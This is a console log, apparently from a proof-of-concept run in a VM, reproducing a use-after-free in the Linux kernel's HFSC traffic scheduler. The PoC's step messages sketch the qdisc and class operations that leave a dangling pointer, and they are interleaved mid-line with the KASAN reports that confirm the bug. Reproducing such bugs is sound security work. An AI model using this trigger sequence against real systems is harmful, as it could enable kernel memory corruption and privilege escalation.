[    2.770451]  hfsc_enqueue+0x5ff/0xe40
[    2.771579]  ? __pfx_hfsc_enqueue+0x10/0x10
[    2.772979]  ? kasan_save_track+0x14/0x30
[    2.773765]  dev_qdisc_enqueue+0x3b/0x140
[    2.774557]  __dev_queue_xmit+0xe14/0x3220
[    2.778855]  ? skb_set_owner_w+0x27e/0x500
[    2.779911]  ? __pfx___dev_queue_xmit+0x10/0x10
[    2.782339]  ? _copy_from_iter+0x214/0x1130
[    2.783176]  ? kvm_clock_get_cycles+0x18/0x30
[    2.783901]  ? __pfx__copy_from_iter+0x10/0x10
[    2.784753]  ? packet_parse_headers+0x3e9/0x8f0
[    2.785631]  ? __pfx_sock_alloc_send_pskb+0x10/0x10
[    2.786454]  ? __pfx_packet_parse_headers+0x10/0x10
[    2.787455]  ? skb_copy_datagram_from_iter+0xe1/0x6a0
[    2.788471]  ? _raw_spin_lock_irqsave+0x86/0xe0
[    2.789357]  packet_sendmsg+0x2183/0x4fc0
[    2.790199]  ? n_tty_write+0x8f4/0xe60
[    2.794460]  ? __pfx_ldsem_down_read+0x10/0x10
[    2.795296]  ? __pfx_selinux_socket_sendmsg+0x10/0x10
[    2.796346]  ? __pfx_packet_sendmsg+0x10/0x10
[    2.797180]  ? mutex_unlock+0x7e/0xd0
[    2.797763]  ? ldsem_up_read+0x12/0x40
[    2.798559]  __sys_sendto+0x3ae/0x420
[    2.799305]  ? __pfx___sys_sendto+0x10/0x10
[    2.799992]  ? ksys_write+0xf8/0x1c0
[    2.800623]  ? __pfx_ksys_write+0x10/0x10
[    2.801269]  ? __call_rcu_common.constprop.0+0x260/0xa90
[    2.802242]  __x64_sys_sendto+0xdb/0x1b0
[    2.803169]  ? clear_bhb_loop+0x55/0xb0
[    2.804310]  ? clear_bhb_loop+0x55/0xb0
[    2.805336]  ? clear_bhb_loop+0x55/0xb0
[    2.806877]  do_syscall_64+0xa6/0x1a0
[    2.807889]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    2.811929] RIP: 0033:0x43bec3
[    2.812552] Code: c7 c2 b8 ff ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 80 3d c1 11 07 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    2.815693] RSP: 002b:00007ffd95ed5c98 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    2.816993] RAX: ffffffffffffffda RBX: 00007ffd95ed5df0 RCX: 000000000043bec3
[    2.818171] RDX: 0000000000000080 RSI: 00007ffd95ed5cc0 RDI: 0000000000000004
[    2.819582] RBP: 0000000000000004 R08: 00007ffd95ed5ca0 R09: 0000000000000014
[    2.821587] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000000
[    2.823218] R13: 0000000000000001 R14: 0000000000000001 R15: 0000000000000001
[    2.824548]  </TASK>
[    2.824961] ---[ end trace 0000000000000000 ]---
[*] step10: DELQDISC Qdisc_C (under B) -> Qdisc_B.qlen=-1
[*] step11: NEWQ[    2.827577] HFSC: pfifo_head_drop qdisc 3000: is non-work-conserving?
[    2.828780] qdisc_peek_len: hfsc qdisc 2000: is non-work-conserving?
DISC pfifo_head_drop Qdisc_C limit=0xFFFFFFFF (packets actually queue now)
[*] step12: CHANGETCLASS class_A -> [    2.831569] ==================================================================
hfsc_change_clas[    2.833444] BUG: KASAN: slab-use-after-free in init_ed+0x3f6/0x4d0
s -> update_ed -[    2.834811] Read of size 8 at addr ffff88800a799910 by task poc/66
[    2.836109] 
> eltree_remove [    2.836450] CPU: 0 UID: 0 PID: 66 Comm: poc Tainted: G        W          6.13.0-09711-g5368a67307b3-dirty #1
+ eltree_insert [    2.836454] Tainted: [W]=WARN
(1st insert)
[*[    2.836455] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
] step13: 2x sma[    2.836457] Call Trace:
ll packet -> elt[    2.836459]  <TASK>
ree_insert(class[    2.836461]  dump_stack_lvl+0x53/0x70
[    2.836468]  print_report+0xce/0x660
_A) (2nd)
[*] s[    2.836488]  ? init_ed+0x3f6/0x4d0
tep14: DELTCLASS[    2.836491]  kasan_report+0xc6/0x100
 class_A -> hfsc[    2.836493]  ? init_ed+0x3f6/0x4d0
[    2.836495]  init_ed+0x3f6/0x4d0
[    2.836498]  hfsc_enqueue+0x743/0xe40
_class freed; rb[    2.836501]  ? __pfx_hfsc_enqueue+0x10/0x10
_tree root holds[    2.836503]  ? kasan_save_track+0x14/0x30
 dangling pointe[    2.836518]  dev_qdisc_enqueue+0x3b/0x140
r
[*] step15: N[    2.836524]  __dev_queue_xmit+0xe14/0x3220
EWTCLASS class_X[    2.836527]  ? skb_set_owner_w+0x27e/0x500
=0x10000002 (HFS[    2.836531]  ? __pfx___dev_queue_xmit+0x10/0x10
C_RSC m1=1 m2=1)[    2.836533]  ? _copy_from_iter+0x214/0x1130

[*] step16: CH[    2.836539]  ? kvm_clock_get_cycles+0x18/0x30
[    2.836543]  ? __pfx__copy_from_iter+0x10/0x10
ANGEQDISC Qdisc_[    2.836546]  ? packet_parse_headers+0x3e9/0x8f0
[    2.836561]  ? __pfx_sock_alloc_send_pskb+0x10/0x10
[    2.836563]  ? __pfx_packet_parse_headers+0x10/0x10
[    2.836565]  ? skb_copy_datagram_from_iter+0xe1/0x6a0
[    2.836568]  ? _raw_spin_lock_irqsave+0x86/0xe0
A defcls=class_X[    2.836572]  packet_sendmsg+0x2183/0x4fc0
[    2.836575]  ? n_tty_write+0x8f4/0xe60

[*] step17: se[    2.836578]  ? __pfx_ldsem_down_read+0x10/0x10
[    2.836581]  ? __pfx_selinux_socket_sendmsg+0x10/0x10
[    2.836584]  ? __pfx_packet_sendmsg+0x10/0x10
[    2.836586]  ? mutex_unlock+0x7e/0xd0
[    2.836589]  ? ldsem_up_read+0x12/0x40
nd packet -> elt[    2.836591]  __sys_sendto+0x3ae/0x420
[    2.836594]  ? __pfx___sys_sendto+0x10/0x10
ree_insert walks[    2.836597]  ? ksys_write+0xf8/0x1c0
 dangling rb_nod[    2.836601]  ? __pfx_ksys_write+0x10/0x10
e -> KASAN UAF e[    2.836604]  __x64_sys_sendto+0xdb/0x1b0
xpected
[    2.836606]  ? clear_bhb_loop+0x55/0xb0
[    2.836609]  ? clear_bhb_loop+0x55/0xb0
[    2.836611]  ? clear_bhb_loop+0x55/0xb0
[    2.836613]  do_syscall_64+0xa6/0x1a0
[    2.836616]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    2.836619] RIP: 0033:0x43bec3
[    2.836621] Code: c7 c2 b8 ff ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 80 3d c1 11 07 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    2.836623] RSP: 002b:00007ffd95ed5c98 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    2.836626] RAX: ffffffffffffffda RBX: 00007ffd95ed5df0 RCX: 000000000043bec3
[    2.836628] RDX: 0000000000000080 RSI: 00007ffd95ed5cc0 RDI: 0000000000000004
[    2.836629] RBP: 0000000000000004 R08: 00007ffd95ed5ca0 R09: 0000000000000014
[    2.836630] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000000
[    2.836631] R13: 0000000000000001 R14: 0000000000000001 R15: 0000000000000001
[    2.836633]  </TASK>
[    2.836634] 
[    2.890590] Allocated by task 66:
[    2.891310]  kasan_save_stack+0x33/0x60
[    2.891988]  kasan_save_track+0x14/0x30
[    2.892674]  __kasan_kmalloc+0x8f/0xa0
[    2.893393]  hfsc_change_class+0x55d/0x3380
[    2.894100]  tc_ctl_tclass+0x3d6/0x12a0
[    2.894746]  rtnetlink_rcv_msg+0x365/0xa40
[    2.895623]  netlink_rcv_skb+0x12f/0x370
[    2.896332]  netlink_unicast+0x5c2/0x830
[    2.897056]  netlink_sendmsg+0x75c/0xc00
[    2.897835]  ____sys_sendmsg+0x822/0xa00
[    2.898512]  ___sys_sendmsg+0x100/0x180
[    2.899164]  __sys_sendmsg+0x11d/0x1b0
[    2.900002]  do_syscall_64+0xa6/0x1a0
[    2.900728]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    2.901645] 
[    2.901991] Freed by task 66:
[    2.902614]  kasan_save_stack+0x33/0x60
[    2.903309]  kasan_save_track+0x14/0x30
[    2.903964]  kasan_save_free_info+0x3b/0x60
[    2.904718]  __kasan_slab_free+0x37/0x50
[    2.905516]  kfree+0xcf/0x360
[    2.906044]  hfsc_delete_class+0x42b/0x750
[    2.906846]  tc_ctl_tclass+0xe7d/0x12a0
[    2.907714]  rtnetlink_rcv_msg+0x365/0xa40
[    2.909025]  netlink_rcv_skb+0x12f/0x370
[    2.909948]  netlink_unicast+0x5c2/0x830
[    2.910868]  netlink_sendmsg+0x75c/0xc00
[    2.911617]  ____sys_sendmsg+0x822/0xa00
[    2.912612]  ___sys_sendmsg+0x100/0x180
[    2.913385]  __sys_sendmsg+0x11d/0x1b0
[    2.914157]  do_syscall_64+0xa6/0x1a0
[    2.914817]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    2.915786] 
[    2.916077] The buggy address belongs to the object at ffff88800a799800
[    2.916077]  which belongs to the cache kmalloc-1k of size 1024
[    2.918392] The buggy address is located 272 bytes inside of
[    2.918392]  freed 1024-byte region [ffff88800a799800, ffff88800a799c00)
[    2.920656] 
[    2.920997] The buggy address belongs to the physical page:
[    2.922050] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0xa798
[    2.923364] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    2.924602] flags: 0x100000000000040(head|node=0|zone=1)
[    2.925575] page_type: f5(slab)
[    2.926175] raw: 0100000000000040 ffff888006c41dc0 dead000000000122 0000000000000000
[    2.927913] raw: 0000000000000000 0000000080100010 00000000f5000000 0000000000000000
[    2.929371] head: 0100000000000040 ffff888006c41dc0 dead000000000122 0000000000000000
[    2.930880] head: 0000000000000000 0000000080100010 00000000f5000000 0000000000000000
[    2.932224] head: 0100000000000003 ffffea000029e601 ffffffffffffffff 0000000000000000
[    2.933579] head: 0000000000000008 0000000000000000 00000000ffffffff 0000000000000000
[    2.935127] page dumped because: kasan: bad access detected
[    2.936049] 
[    2.936331] Memory state around the buggy address:
[    2.937172]  ffff88800a799800: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    2.938545]  ffff88800a799880: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    2.939870] >ffff88800a799900: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    2.941027]                          ^
[    2.941707]  ffff88800a799980: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    2.942985]  ffff88800a799a00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    2.944341] ==================================================================
[    2.945847] Disabling lock debugging due to kernel taint
[*] poc finished without crash; this is unexpected on the vulnerable kernel
[    2.966827] poc (66) used greatest stack depth: 26280 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    2.986494] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    4.358087] ACPI: PM: Preparing to enter system sleep state S5
[    4.359280] reboot: Power down
CONFIRMED: KASAN_UAF
